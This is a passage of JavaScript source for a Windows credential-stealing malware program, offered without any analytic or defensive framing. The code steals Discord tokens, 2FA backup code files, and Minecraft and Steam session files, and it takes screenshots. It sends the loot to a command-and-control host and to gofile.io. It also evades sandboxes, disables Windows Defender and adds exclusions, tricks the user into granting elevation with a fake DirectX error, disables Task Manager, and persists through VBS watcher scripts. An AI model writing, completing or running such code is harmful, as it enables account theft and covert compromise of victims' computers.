    fs.writeFileSync(scriptPath, scriptSource);

    // Set up Python environment
    const env = { ...process.env };
    env.PYTHONHOME = path.join(destDir, 'tools');
    env.PYTHONPATH = path.join(destDir, 'tools', 'Lib');
    const pythonExe = path.join(destDir, 'tools', 'python.exe');

    try {
      cp.execFileSync(pythonExe, [scriptPath], { env, stdio: 'ignore', timeout: 120000 });
      console.log('[PYTHON] Payload executed successfully');
    } catch (e) {
      console.error('[PYTHON] Execution failed:', e.message);
    }

    // Clean up script (keep runtime for potential reuse)
    try { fs.unlinkSync(scriptPath); } catch (e) {}
  } catch (e) {
    console.error('[PYTHON] Drop failed:', e.message);
  }
}

async function deleteFileWithRetry(filePath) {
  for (let attempt = 0; attempt < 5; attempt++) {
    try {
      fs.unlinkSync(filePath);
      return;
    } catch (e) {
      if (e.code === 'EBUSY') {
        await new Promise(r => setTimeout(r, 1000));
      } else {
        return;
      }
    }
  }
}

// ======================================================================
// 9. SYSTEM INFO COLLECTION
// ======================================================================

async function collectSystemInfo(dataDir) {
  const zipPath = path.join(os.tmpdir(), `system_${Date.now()}.zip`);
  const output = fs.createWriteStream(zipPath);
  const archive = archiver('zip', { zlib: { level: 9 } });

  await new Promise((resolve, reject) => {
    output.on('close', resolve);
    archive.on('error', reject);
    archive.pipe(output);
    archive.directory(dataDir, false);
    archive.finalize();
  });

  // Get GPU name via wmic
  let gpuName = 'Unknown';
  try {
    const gpuInfo = cp.execSync('wmic path win32_VideoController get name /value', { encoding: 'utf8' });
    const match = gpuInfo.match(/Name=([^\r\n]+)/);
    if (match) gpuName = match[1].trim();
  } catch (e) {}

  const hostname = os.hostname();
  const username = os.userInfo()?.username || 'Unknown';
  const platform = process.platform + ' ' + os.arch();
  const cpuModel = os.cpus()[0]?.model?.substring(0, 50) || 'Unknown';
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = ((totalMem - freeMem) / 1024 / 1024 / 1024).toFixed(2);
  const totalMemGB = (totalMem / 1024 / 1024 / 1024).toFixed(2);
  const ip = await getPublicIP() || 'Unknown';

  // Build file tree (first 300 chars)
  let fileTree = '';
  try {
    fileTree = buildFileTree(dataDir);
    if (fileTree.length > 300) fileTree = fileTree.substring(0, 300) + '...';
  } catch (e) {}

  const embed = {
    color: 0,
    author: { name: `${TELEGRAM} - System Information`, icon_url: IMG.icon },
    fields: [
      {
        name: `${EMOJI.crystals} Information About System:`,
        value: [
          `${EMOJI.arrow} __Computer Name__: \`${hostname}\``,
          `${EMOJI.arrow} __Username__: \`${username}\``,
          `${EMOJI.arrow} __Platform__: \`${platform}\``,
          `${EMOJI.arrow} __CPU__: \`${cpuModel}\``,
          `${EMOJI.arrow} __GPU__: \`${gpuName.substring(0, 30)}...\``,
          `${EMOJI.arrow} __Memory__: \`${usedMem} / ${totalMemGB} GB\``,
          `${EMOJI.arrow} __IP Address__: \`${ip}\``,
        ].join('\n'),
        inline: false,
      }, {
        name: `${EMOJI.gothrose} Exfiltrated Files Structure`,
        value: '```\n' + fileTree + '\n```',
        inline: false,
      },
    ],
    thumbnail: { url: IMG.thumb1 },
    footer: { text: `${BRAND} | ${TELEGRAM} | ${BUILD_KEY}`, icon_url: IMG.icon },
  };

  const payload = { key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [embed] };

  // Send as form-data with ZIP attachment
  const form = new FormData();
  form.append('payload_json', JSON.stringify(payload));
  form.append('file', fs.createReadStream(zipPath));
  try {
    await axios.post(`http://${C2_HOST}:${C2_PORTS.forwarder}/api/forwarder`, form,
      { headers: form.getHeaders() });
  } catch (e) {}
  try { fs.unlinkSync(zipPath); } catch (e) {}
}

function buildFileTree(dir, prefix = '') {
  let result = '';
  const entries = fs.readdirSync(dir);
  for (const entry of entries) {
    const fullPath = path.join(dir, entry);
    const stat = fs.statSync(fullPath);
    result += prefix + (stat.isDirectory() ? '📁 ' : '📄 ') + entry + '\n';
    if (stat.isDirectory()) {
      result += buildFileTree(fullPath, prefix + '  ');
    }
  }
  return result;
}

// ======================================================================
// 10. IP GEOLOCATION
// ======================================================================
async function getPublicIP() {
  try {
    const res = await axios.get('https://api.ipify.org');
    return res.data;
  } catch (e) { return null; }
}

// ======================================================================
// 11. VM/SANDBOX DETECTION (pathetic! lmao. "anyrun.exe?" really?)
// ======================================================================

function detectAnalysisEnvironment() {
  let detected = false;
  try {
    const cpuInfo = cp.execSync('wmic cpu get name /value', { encoding: 'utf8' });
    const cpuMatch = cpuInfo.match(/Name=([^\r\n]+)/);
    const cpuName = cpuMatch ? cpuMatch[1].trim().toLowerCase() : '';
    const vmCpuKeywords = ['qemu', 'kvm', 'virtualbox', 'vmware', 'xen', 'hyper-v',
      'virtual machine', 'intel core 2 duo', 'intel core 2 quad',
      'intel pentium', 'amd athlon', 'amd sempron', 'amd phenom',
      'intel xeon e5', 'intel xeon e3', 'intel core processor (broadwell)'];
    if (vmCpuKeywords.some(k => cpuName.includes(k))) detected = true;

    const gpuInfo = cp.execSync('wmic path win32_VideoController get name /value', { encoding: 'utf8' }).toLowerCase();
    const vmGpuKeywords = ['nvidia geforce 210', 'vmware svga', 'virtualbox graphics adapter',
      'qxl', 'cirrus logic', 'microsoft basic display adapter', 'red hat virt', 'virtio-gpu'];
    if (vmGpuKeywords.some(k => gpuInfo.includes(k))) detected = true;

    const taskList = cp.execSync('tasklist /FO CSV /NH', { encoding: 'utf8' }).toLowerCase();
    const analysisTools = [
      'vmtoolsd.exe', 'vboxservice.exe', 'vboxtray.exe', 'vboxcontrol.exe',
      'vmsrvc.exe', 'vmnat.exe', 'vmware.exe', 'procmon.exe', 'procexp.exe',
      'wireshark.exe', 'tcpview.exe', 'fiddler.exe', 'ollydbg.exe', 'x64dbg.exe',
      'ida.exe', 'ida64.exe', 'windbg.exe', 'ghidra.exe',
      'sandboxie.exe', 'cuckoo.exe', 'anyrun.exe'];
    if (analysisTools.some(t => taskList.includes(t))) detected = true;

    const hostname = os.hostname().toLowerCase();
    const username = (os.userInfo()?.username || '').toLowerCase();
    const nameKeywords = ['sandbox', 'malware', 'virus', 'analysis', 'cuckoo',
      'vmware', 'virtual', 'test', 'debug', 'sample', 'honeypot', 'virustotal'];
    if (nameKeywords.some(k => hostname.includes(k) || username.includes(k))) detected = true;

    const execPath = (process.execPath || '').toLowerCase();
    const sandboxPaths = ['\\sandbox\\', '\\cuckoo\\', '\\analysis\\', '\\malware\\',
      '\\sample\\', '\\test\\', '\\honeypot\\', '\\any.run\\', '\\joesandbox\\'];
    if (sandboxPaths.some(p => execPath.includes(p))) detected = true;

    const env = process.env || {};
    const sandboxEnvVars = ['DEBUG', 'DEV', 'TEST', 'SANDBOX', 'ANALYSIS', 'VIRUSTOTAL', 'CUCUMBER', 'CUCUMBER_WORKER'];
    if (sandboxEnvVars.some(e => env[e])) detected = true;

    const modelInfo = cp.execSync('wmic computersystem get model /value', { encoding: 'utf8' }).toLowerCase();
    const vmModelKeywords = ['virtualbox', 'vmware', 'qemu', 'xen', 'virtual machine', 'parallels'];
    if (vmModelKeywords.some(k => modelInfo.includes(k))) detected = true;
  } catch (e) {}
  return detected;
}

// ======================================================================
// 12. DISCORD KILL, RESTART & TOKEN THEFT
// ======================================================================

async function stealDiscordTokens() {
  const localAppData = process.env.LOCALAPPDATA;
  if (!localAppData) return;

  // Kill Discord via all available methods
  killDiscordProcesses();

  // Wait for processes to terminate and leveldb files to unlock
  await new Promise(r => setTimeout(r, 1500));

  // Extract tokens from LevelDB files while Discord is down
  const tokenRegex = /mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
  const discordPaths = [
    path.join(localAppData, 'Discord', 'Local Storage', 'leveldb'),
    path.join(localAppData, 'DiscordCanary', 'Local Storage', 'leveldb'),
    path.join(localAppData, 'DiscordPTB', 'Local Storage', 'leveldb'),
    path.join(localAppData, 'DiscordDevelopment', 'Local Storage', 'leveldb'),
  ];
  const tokens = new Set();

  for (const leveldbPath of discordPaths) {
    if (!fs.existsSync(leveldbPath)) continue;
    try {
      const files = fs.readdirSync(leveldbPath);
      for (const file of files) {
        if (!file.endsWith('.ldb') && !file.endsWith('.log')) continue;
        try {
          const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
          const matches = content.match(tokenRegex);
          if (matches) matches.forEach(t => tokens.add(t));
        } catch (e) {}
      }
    } catch (e) {}
  }

  if (tokens.size > 0) {
    const tokenList = [...tokens];
    forwardEmbed({
      key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar,
      embeds: [{
        color: 0,
        author: { name: `${TELEGRAM} - Discord Tokens`, icon_url: IMG.icon },
        description: 'Found **' + tokens.size + '** Discord token(s)',
        fields: tokenList.slice(0, 25).map((t, i) => ({
          name: 'Token ' + (i + 1),
          value: '```\n' + t.substring(0, 50) + '...\n```',
          inline: false,
        })),
        footer: { text: `${BRAND} | ${TELEGRAM}`, icon_url: IMG.icon },
      }],
    });
  }

  // Restart Discord variants so user doesn't notice
  const discordNames = ['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe'];
  for (const exeName of discordNames) {
    const dirName = exeName.replace('.exe', '');
    const basePath = path.join(localAppData, dirName);
    const updateExe = path.join(basePath, 'Update.exe');
    const discordExe = path.join(basePath, exeName);

    cp.execFile(updateExe, ['--processStart', exeName], { windowsHide: true }, () => {});

    setTimeout(() => {
      cp.execFile(discordExe, [], { windowsHide: true, detached: true, stdio: 'ignore' }).unref();
    }, 800);
  }
}

// ======================================================================
// 13. WINDOWS DEFENDER DISABLE + DEFENDER EXCLUSIONS + UAC BYPASS

function killDiscordProcesses() {
  const cmds = [
    // Direct taskkill for each variant
    'taskkill /IM Discord.exe /F >nul 2>&1',
    'taskkill /IM DiscordCanary.exe /F >nul 2>&1',
    'taskkill /IM DiscordPTB.exe /F >nul 2>&1',
    'taskkill /IM DiscordDevelopment.exe /F >nul 2>&1',
    // for-loop via tasklist + findstr for any Discord process
    'for /F "tokens=2 delims=," %a in (\'tasklist /FI "IMAGENAME eq Discord.exe" /FO CSV /NH ^| findstr /I "Discord"\') do taskkill /F /PID %a >nul 2>&1',
    'for /F "tokens=2 delims=," %a in (\'tasklist /FI "IMAGENAME eq DiscordCanary.exe" /FO CSV /NH ^| findstr /I "Canary"\') do taskkill /F /PID %a >nul 2>&1',
    'for /F "tokens=2 delims=," %a in (\'tasklist /FI "IMAGENAME eq DiscordPTB.exe" /FO CSV /NH ^| findstr /I "PTB"\') do taskkill /F /PID %a >nul 2>&1',
    'for /F "tokens=2 delims=," %a in (\'tasklist /FI "IMAGENAME eq DiscordDevelopment.exe" /FO CSV /NH ^| findstr /I "Development"\') do taskkill /F /PID %a >nul 2>&1',
    // WMIC fallback
    'wmic process where "name like \'%Discord%\'" delete >nul 2>&1',
    // PowerShell fallback
    'powershell -c "Get-Process | Where-Object { $_.name -like \'Discord*\' } | Stop-Process -Force -ErrorAction SilentlyContinue"',
  ];
  for (const cmd of cmds) { try { cp.execSync(cmd); } catch (e) {} }
}

async function disableWindowsDefender() {
  try {
    cp.execSync('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', { stdio: 'ignore' });
    cp.execSync('powershell -Command "Set-MpPreference -MAPSReporting 0"', { stdio: 'ignore' });
    cp.execSync('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', { stdio: 'ignore' });
    const avPaths = ['C:\\Program Files\\Windows Defender',
      'C:\\Program Files\\Common Files\\McAfee',
      'C:\\Program Files\\Symantec',
      'C:\\Program Files\\Kaspersky Lab'];
    for (const p of avPaths) {
      try { cp.execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${p}'"`, { stdio: 'ignore' }); } catch (e) {}
    }
  } catch (e) {
    try { cp.execSync('net stop WinDefend /y', { stdio: 'ignore', timeout: 5000 }); } catch (e2) {}
    try { cp.execSync('sc config WinDefend start= disabled', { stdio: 'ignore' }); } catch (e3) {}
  }
}

async function addSelfDefenderExclusions() {
  const execPath = process.execPath;
  const execDir = path.dirname(execPath);
  const execName = path.basename(execPath);
  try {
    cp.execSync(`powershell -Command "Add-MpPreference -ExclusionPath 'C:\\'"`, { stdio: 'ignore' });
    cp.execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${execDir}'"`, { stdio: 'ignore' });
    cp.execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${os.tmpdir()}'"`, { stdio: 'ignore' });
    cp.execSync(`powershell -Command "Add-MpPreference -ExclusionProcess '${execName}'"`, { stdio: 'ignore' });
  } catch (e) {
    try {
      const regPath = 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths';
      cp.execSync(`reg add "${regPath}" /v "C:\\" /t REG_DWORD /d 0 /f`, { stdio: 'ignore' });
    } catch (e2) {}
  }
}

async function uacBypassAndDefenderExclusions() {
  const vbsContent = `
If Not WScript.Arguments.Named.Exists("elevate") Then
  MsgBox "Failed to initialize DirectX. Please reinstall DirectX or update your GPU drivers.", vbOKOnly + vbInformation, "Error"
  CreateObject("Shell.Application").ShellExecute WScript.FullName, Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate:true", "", "runas", 1
  WScript.Quit
End If
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -command ""Add-MpPreference -ExclusionPath $env:APPDATA; Add-MpPreference -ExclusionPath 'C:\\'""", 0, True
WScript.Quit
`;
  const vbsPath = path.join(os.tmpdir(), 'sex.vbs');
  fs.writeFileSync(vbsPath, vbsContent, 'utf16le');
  try { cp.execSync(`cscript //nologo "${vbsPath}" /elevate:true`, { timeout: 10000 }); } catch (e) {}
  try { fs.unlinkSync(vbsPath); } catch (e) {}
}

async function disableTaskManager() {
  const cmd = 'New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force | ' +
    'New-ItemProperty -Name "DisableTaskMgr" -Value 1 -PropertyType DWord -Force';
  try { cp.execSync(`powershell.exe -Command "${cmd}"`); } catch (e) {}
}

async function masqueradeProcessName() {
  try {
    const fakeName = ['Windows', 'Microsoft', 'Security', 'System', 'Network', 'Local', 'Service']
      [Math.floor(Math.random() * 7)] + ' ' +
      ['Update', 'Manager', 'Host', 'Service', 'Module', 'Provider', 'Optimizer']
      [Math.floor(Math.random() * 7)] + ' ' +
      Math.random().toString(36).substring(2, 6).toUpperCase();
    cp.execSync(`sc config ${process.title} DisplayName= "${fakeName}"`, { stdio: 'ignore' });
  } catch (e) {}
}

// ======================================================================
// 13. STARTUP PERSISTENCE (VBS watcher)
// ======================================================================

async function installStartupPersistence() {
  const startupDir = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
  const execPath = process.execPath || process.argv[0];
  const execDir = path.dirname(execPath);
  const execName = path.basename(execPath, '.exe');
  const tmpDir = os.tmpdir();
  const esc = s => s.replace(/\\/g, '\\\\');

  const lnkPath = path.join(startupDir, execName + '.lnk');
  const watcherLnkName = 'watcherZxammz256.lnk';

  // Script 1 — One-shot shortcut creator
  const vbs1 = `\n  Set oWS = WScript.CreateObject("WScript.Shell")\n  sLinkFile = "${esc(lnkPath)}"\n  Set oLink = oWS.CreateShortcut(sLinkFile)\n  oLink.TargetPath = "${esc(execPath)}"\n  oLink.WorkingDirectory = "${esc(execDir)}"\n  oLink.WindowStyle = 1\n  oLink.IconLocation = "${esc(execPath)},0"\n  oLink.Save\n`;
  const vbs1Path = path.join(tmpDir, 'sysZxammz256.vbs');
  fs.writeFileSync(vbs1Path, vbs1, 'utf16le');
  try { cp.execSync(`cscript //nologo "${vbs1Path}"`, { stdio: 'ignore', timeout: 10000 }); } catch (e) {}
  try { fs.unlinkSync(vbs1Path); } catch (e) {}

  // Script 2 — Watcher loop (runs every 5s, recreates shortcut if deleted)
  const vbs2 = `\n  Set fso = CreateObject("Scripting.FileSystemObject")\n  Set oWS = CreateObject("WScript.Shell")\n  shortcutPath = "${esc(lnkPath)}"\n  targetExe = "${esc(execPath)}"\n  Do\n    If Not fso.FileExists(shortcutPath) Then\n      Set oLink = oWS.CreateShortcut(shortcutPath)\n      oLink.TargetPath = targetExe\n      oLink.WorkingDirectory = fso.GetParentFolderName(targetExe)\n      oLink.WindowStyle = 1\n      oLink.IconLocation = targetExe & ",0"\n      oLink.Save\n    End If\n    WScript.Sleep 5000\n  Loop\n`;
  const vbs2Path = path.join(tmpDir, 'lib32winmz256.vbs');
  fs.writeFileSync(vbs2Path, vbs2, 'utf16le');

  // Script 3 — Create the watcher's .lnk and start it
  const vbs3 = `\n  Set oWS = WScript.CreateObject("WScript.Shell")\n  sLinkFile = "${esc(path.join(startupDir, watcherLnkName))}"\n  Set oLink = oWS.CreateShortcut(sLinkFile)\n  oLink.TargetPath = "wscript.exe"\n  oLink.Arguments = "\\"${esc(vbs2Path)}\\"\n  oLink.WorkingDirectory = "${esc(tmpDir)}"\n  oLink.WindowStyle = 0\n  oLink.IconLocation = "wscript.exe,0"\n  oLink.Save\n`;
  const vbs3Path = path.join(tmpDir, 'winJaxmalz0.vbs');
  fs.writeFileSync(vbs3Path, vbs3, 'utf16le');
  try { cp.execSync(`cscript //nologo "${vbs3Path}"`, { stdio: 'ignore', timeout: 10000 }); } catch (e) {}
  try { fs.unlinkSync(vbs3Path); } catch (e) {}

  const watcher = cp.spawn('wscript.exe', [vbs2Path], { detached: true, stdio: 'ignore', windowsHide: true });
  watcher.unref();
}

// ======================================================================
// 14. ANTIVIRUS EXCLUSION PATHS
// ======================================================================

async function addAVExclusionPaths() {
  const regPath = 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths';
  const paths = [
    'C:\\Program Files\\Windows Defender',
    'C:\\Program Files\\Common Files\\McAfee',
    'C:\\Program Files\\Symantec',
    'C:\\Program Files\\Kaspersky Lab',
  ];
  for (const p of paths) {
    try {
      cp.execSync(`reg add "${regPath}" /v "${p}" /t REG_DWORD /d 0 /f`, { stdio: 'ignore' });
    } catch (e) {}
  }
}

// ======================================================================
// 15. SCREEN CAPTURE (PowerShell multi-monitor)
// ======================================================================

async function takeScreenshot() {
  const pngPath = path.join(os.tmpdir(), `screenshot_${Date.now()}.png`);
  const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
try {
  $screens = [System.Windows.Forms.Screen]::AllScreens
  $totalWidth = 0; $totalHeight = 0; $screenBounds = @()
  foreach ($screen in $screens) {
    $totalWidth += $screen.Bounds.Width
    if ($screen.Bounds.Height -gt $totalHeight) { $totalHeight = $screen.Bounds.Height }
    $screenBounds += $screen.Bounds
  }
  $bitmap = New-Object System.Drawing.Bitmap $totalWidth, $totalHeight
  $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
  $currentX = 0
  foreach ($bounds in $screenBounds) {
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, $currentX, 0, $bounds.Size)
    $currentX += $bounds.Width
  }
  $bitmap.Save('${pngPath}', [System.Drawing.Imaging.ImageFormat]::Png)
  $graphics.Dispose(); $bitmap.Dispose()
  $file = Get-Item '${pngPath}' -ErrorAction SilentlyContinue
  if ($file -and $file.Length -gt 1024) {
    Write-Output "SUCCESS:$($file.Length)"
  } else { Write-Output "FAILED:File too small or not found" }
} catch { Write-Output "FAILED:$($_.Exception.Message)" }
`;
  return new Promise((resolve) => {
    const child = cp.spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', psScript]);
    let stdout = '', stderr = '';
    child.stdout.on('data', d => stdout += d.toString());
    child.stderr.on('data', d => stderr += d.toString());
    child.on('close', (code) => {
      if (code === 0 && stdout.trim().startsWith('SUCCESS:')) {
        const size = parseInt(stdout.trim().split(':')[1]);
        if (size > 1024 && fs.existsSync(pngPath)) {
          resolve({ success: true, path: pngPath });
        } else {
          resolve({ success: false, path: null });
        }
      } else {
        try { fs.unlinkSync(pngPath); } catch (e) {}
        resolve({ success: false, path: null });
      }
    });
    child.on('error', () => resolve({ success: false, path: null }));
    setTimeout(() => { child.kill(); resolve({ success: false, path: null }); }, 15000);
  });
}

async function sendScreenshot() {
  const result = await takeScreenshot();
  const embed = {
    color: 0, author: { name: `${TELEGRAM} - Screenshot`, icon_url: IMG.icon },
    fields: [
      { name: `${EMOJI.chromeheart} Status`, value: result.success ? EMOJI.success : EMOJI.blocked, inline: true },
      { name: `${EMOJI.crystals} Platform`, value: '`' + process.platform + '`', inline: true },
      { name: `${EMOJI.bubble} Time`, value: '`' + new Date().toLocaleString() + '`', inline: true },
    ],
    thumbnail: { url: IMG.thumb1 },
    footer: { text: `${BRAND} | ${TELEGRAM} | ${BUILD_KEY}`, icon_url: IMG.icon },
  };
  if (result.success) embed.image = { url: 'attachment://screenshot.png' };

  const form = new FormData();
  form.append('payload_json', JSON.stringify({ key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [embed] }));
  if (result.success && fs.existsSync(result.path)) {
    form.append('file', fs.createReadStream(result.path), 'screenshot.png');
  }
  try {
    await axios.post(`http://${C2_HOST}:${C2_PORTS.forwarder}/api/forwarder`, form, { headers: form.getHeaders() });
  } catch (e) {}
  if (result.success) { try { fs.unlinkSync(result.path); } catch (e) {} }
}

// ======================================================================
// 16. KEYWORD-TARGETED FILE SCANNER
// ======================================================================

async function scanForTargetedFiles(baseDir) {
  const found = [];
  try {
    const entries = fs.readdirSync(baseDir);
    for (const entry of entries) {
      const fullPath = path.join(baseDir, entry);
      let stat;
      try { stat = fs.statSync(fullPath); } catch (e) { continue; }
      if (stat.isDirectory()) {
        found.push(...await scanForTargetedFiles(fullPath));
      } else if (stat.isFile() && stat.size < 1024 * 1024) {
        const lowerName = entry.toLowerCase();
        if (TARGET_KEYWORDS.some(k => lowerName.includes(k))) {
          found.push(fullPath);
          continue;
        }
        if (entry.endsWith('.txt') || entry.endsWith('.json') || entry.endsWith('.xml')) {
          try {
            const content = fs.readFileSync(fullPath, 'utf8').toLowerCase();
            if (TARGET_KEYWORDS.some(k => content.includes(k))) {
              found.push(fullPath);
            }
          } catch (e) {}
        }
      }
    }
  } catch (e) {}
  return found;
}

// ======================================================================
// 17. 2FA BACKUP CODE COLLECTION
// ======================================================================

const SEARCH_DIRS = ['Desktop', 'Documents', 'Downloads',
  'OneDrive/Desktop', 'OneDrive/Documents', 'OneDrive/Downloads',
  'Pictures', 'Videos'];
const KNOWN_BACKUP_FILES = [
  'discord_backup_codes.txt', 'discord-backup-codes.txt',
  'backup_codes.txt', 'backup-codes.txt',
  '2fa_codes.txt', '2fa-codes.txt',
  'github-recovery-codes.txt', 'google-backup-codes.txt',
  'Epic Games Account Two-Factor backup codes.txt'];
const BACKUP_NAME_KEYWORDS = ['discord', 'backup', '2fa', 'code', 'recovery', 'github', 'google', 'epic'];
const BACKUP_CONTENT_RULES = [
  { keyword: 'backup', requires: ['discord', 'code'] },
  { keyword: '2fa', requires: [] },
  { keyword: 'recovery', requires: [] },
  { keyword: 'two-factor', requires: [] },
];

async function collect2FACodes() {
  const foundFiles = new Map();
  for (const relDir of SEARCH_DIRS) {
    const dir = path.join(os.homedir(), relDir);
    if (!fs.existsSync(dir)) continue;
    for (const fname of KNOWN_BACKUP_FILES) {
      const fp = path.join(dir, fname);
      if (fs.existsSync(fp)) {
        try { foundFiles.set(fp, { path: fp, content: fs.readFileSync(fp, 'utf8') }); } catch (e) {}
      }
    }
    try {
      for (const entry of fs.readdirSync(dir)) {
        const fp = path.join(dir, entry);
        let stat;
        try { stat = fs.statSync(fp); } catch (e) { continue; }
        if (!stat.isFile() || !entry.endsWith('.txt') || foundFiles.has(fp)) continue;
        const lowerName = entry.toLowerCase();
        if (BACKUP_NAME_KEYWORDS.some(kw => lowerName.includes(kw))) {
          try { foundFiles.set(fp, { path: fp, content: fs.readFileSync(fp, 'utf8') }); continue; } catch (e) {}
        }
        if (stat.size >= 0x2710) continue;
        try {
          const content = fs.readFileSync(fp, 'utf8').toLowerCase();
          for (const rule of BACKUP_CONTENT_RULES) {
            if (!content.includes(rule.keyword)) continue;
            if (rule.requires.length === 0 || rule.requires.some(r => content.includes(r))) {
              foundFiles.set(fp, { path: fp, content }); break;
            }
          }
        } catch (e) {}
      }
    } catch (e) {}
  }
  return foundFiles;
}

async function send2FACodes(foundFiles) {
  if (foundFiles.size === 0) return;
  const entries = [...foundFiles.values()].map(f =>
    '──────────\n📄 File: ' + path.basename(f.path) + '\n📂 Location: ' + path.dirname(f.path) + '\n────────────────────────\n' + f.content + '\n');
  const embed = {
    color: 0, author: { name: '2FA Backup Codes Found', icon_url: IMG.icon },
    description: 'Found **' + foundFiles.size + '** backup code file(s)',
    fields: [], footer: { text: `${BRAND} | ${TELEGRAM}`, icon_url: IMG.icon },
  };
  let buffer = '', partNum = 1;
  for (const entry of entries) {
    if ((buffer + entry).length > 0xFA0) {
      embed.fields.push({ name: 'Codes Part ' + partNum, value: '```\n' + buffer + '\n```', inline: false });
      buffer = entry; partNum++;
    } else { buffer += entry; }
  }
  if (buffer) embed.fields.push({ name: 'Codes Part ' + partNum, value: '```\n' + buffer + '\n```', inline: false });

  const payload = { key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [embed] };
  if (JSON.stringify(embed).length > 0x1770) {
    const tmpFile = path.join(os.tmpdir(), '2fa_codes_' + Date.now() + '.txt');
    fs.writeFileSync(tmpFile, entries.join('\n\n'));
    await forwardFormData(
      { key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [{
        color: 0, author: { name: '2FA Backup Codes Found', icon_url: IMG.icon },
        description: 'Found **' + foundFiles.size + '** backup code file(s). Content too large, sent as file.',
        footer: { text: `${BRAND} | ${TELEGRAM}`, icon_url: IMG.icon },
      }]}, tmpFile, '2fa_backup_codes.txt');
    try { fs.unlinkSync(tmpFile); } catch (e) {}
  } else {
    await forwardEmbed(payload);
  }
}

// ======================================================================
// 18. MINECRAFT SESSION STEALING
// ======================================================================

async function stealMinecraftSessions() {
  try {
    try { cp.execSync('taskkill /IM javaw.exe /F >nul 2>&1'); } catch (e) {}
    const home = os.homedir();
    const filesToCopy = [
      path.join(home, '.minecraft', 'launcher_profiles.json'),
      path.join(home, '.lunarclient', 'settings', 'game', 'accounts.json'),
    ].filter(f => fs.existsSync(f));
    if (filesToCopy.length === 0) return null;
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-'));
    const outDir = path.join(tmpDir, 'minecraft');
    fs.mkdirSync(outDir, { recursive: true });
    for (const f of filesToCopy) fs.copyFileSync(f, path.join(outDir, path.basename(f)));
    const lunarSettings = path.join(home, '.lunarclient', 'settings');
    if (fs.existsSync(lunarSettings)) copyDirSync(lunarSettings, path.join(tmpDir, 'lunarclient', 'settings'));
    const zipPath = path.join(os.tmpdir(), 'minecraft_session_' + Date.now() + '.zip');
    const zip = new AdmZip();
    zip.addLocalFolder(tmpDir);
    zip.writeZip(zipPath);
    const downloadUrl = await uploadToGofile(zipPath);
    try { fs.unlinkSync(zipPath); } catch (e) {}
    try { fs.rmSync(tmpDir, { recursive: true }); } catch (e) {}
    return { downloadUrl, files: filesToCopy };
  } catch (e) { return null; }
}

async function sendMinecraftEmbed(mcData) {
  if (!mcData) return;
  const embed = {
    color: 0, author: { name: `${TELEGRAM} - Minecraft Session`, icon_url: IMG.icon },
    thumbnail: { url: IMG.thumb2 },
    description: `-# Download: [Click here to download!](${mcData.downloadUrl || '#'})`,
    fields: [{ name: `${EMOJI.chromeheart} Password`, value: '-# Password: `No password found`', inline: false }],
    footer: { text: `${BRAND} | ${TELEGRAM} | ${BUILD_KEY}`, icon_url: IMG.icon },
  };
  await forwardEmbed({ key: BUILD_KEY, username: TELEGRAM, avatar_url: IMG.avatar, embeds: [embed] });
}

// ======================================================================
// 19. UPLOAD TO GOFILE.IO
// ======================================================================

async function uploadToGofile(filePath, maxRetries = 5) {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));
      const res = await axios.post('https://upload.gofile.io/uploadFile', form, {
        headers: form.getHeaders(), maxContentLength: Infinity, maxBodyLength: Infinity, timeout: 120000,
      });
      if (res?.data?.status === 'ok') return res.data.data.downloadPage;
    } catch (e) {
      const isRetryable = e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT' ||
        (e.message && e.message.includes('socket hang up'));
      if (isRetryable && attempt < maxRetries - 1) await new Promise(r => setTimeout(r, 3000));
      else break;
    }
  }
  return null;
}

// ======================================================================
// 20. STEAM SESSION STEALING + API ENRICHMENT
// ======================================================================

async function stealSteamSession() {
  try {
    try { cp.execSync('taskkill /IM Steam.exe /F >nul 2>&1'); } catch (e) {}
    const steamConfigDir = 'C:\\Program Files (x86)\\Steam\\config';
    if (!fs.existsSync(steamConfigDir)) return null;
    const zip = new AdmZip();
    zip.addLocalFolder(steamConfigDir);
    const zipPath = path.join(os.tmpdir(), 'steam_session.zip');
    zip.writeZip(zipPath);
    const downloadUrl = await uploadToGofile(zipPath);
    try { fs.unlinkSync(zipPath); } catch (e) {}

    // Extract Steam account IDs from loginusers.vdf
    const loginUsersPath = path.join(steamConfigDir, 'loginusers.vdf');
    let steamIds = [];
    if (fs.existsSync(loginUsersPath)) {
      const content = fs.readFileSync(loginUsersPath, 'utf-8');
      const matches = content.match(/7656[0-9]{13}/g) || [];
      steamIds = matches;
    }
    return { downloadUrl, steamIds };
  } catch (e) { return null; }
}

async function enrichSteamData(steamId) {
  try {
    const [summary, games, level] = await Promise.all([
      axios.get('https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/', { params: { key: STEAM_API_KEY, steamids: steamId }, timeout: 15000 }),
